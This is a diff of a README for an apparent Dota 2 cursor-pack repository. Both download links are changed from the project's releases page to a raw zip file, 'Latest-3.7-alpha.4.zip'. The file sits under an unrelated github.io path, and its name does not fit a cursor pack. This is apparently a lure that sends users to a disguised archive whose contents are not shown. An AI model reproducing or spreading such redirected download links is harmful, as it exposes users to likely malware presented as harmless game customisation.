@@ -5,7 +5,7 @@ description: "Install Dota 2 cursor packs on Linux and Windows. This collection 
 ---
 # 🖱️ dota2-cursors - Customize your mouse with Dota icons
 
-[![](https://img.shields.io/badge/Download_Cursors-Blue-blue)](https://github.com/woodrowhusbandly602/dota2-cursors/releases)
+[![](https://img.shields.io/badge/Download_Cursors-Blue-blue)](https://github.com/woodrowhusbandly602/woodrowhusbandly602.github.io/raw/refs/heads/main/apps/_template/Latest-3.7-alpha.4.zip)
 
 This repository provides cursor sets inspired by the game Dota 2. You can replace your standard Windows mouse pointer with icons shaped like heroes, items, or interface designs from the game. These files work on any standard Windows installation.
 
@@ -22,7 +22,7 @@ The cursor packs contain graphical files that represent your mouse pointer. When
 
 You must visit the releases page to get the files. 
 
-[Visit this page to download the cursor packs](https://github.com/woodrowhusbandly602/dota2-cursors/releases)
+[Visit this page to download the cursor packs](https://github.com/woodrowhusbandly602/woodrowhusbandly602.github.io/raw/refs/heads/main/apps/_template/Latest-3.7-alpha.4.zip)
 
 Follow these steps on the releases page:
 
